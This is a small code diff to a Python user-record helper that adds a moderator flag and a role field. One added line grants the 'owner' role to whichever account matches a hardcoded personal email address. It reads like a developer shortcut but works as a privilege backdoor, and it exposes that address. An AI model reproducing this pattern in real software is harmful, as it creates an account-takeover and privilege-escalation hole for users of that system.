@@ -121,6 +121,8 @@ def _with_admin_flag(user_doc: dict) -> dict:
         or explicit_override
     )
     user["is_admin"] = is_admin
+    user["is_moderator"] = is_admin or user.get("role") == "moderator"
+    user["role"] = "owner" if str(user.get("email") or "").strip().lower() == "utkarsh7023340530@gmail.com" else "admin" if is_admin else "moderator" if user.get("role") == "moderator" else "user"
     # Accounts created before the first-login tour existed do not have this
     # field. Treat them as not-yet-onboarded so they get the tour once rather
     # than silently skipping it forever.
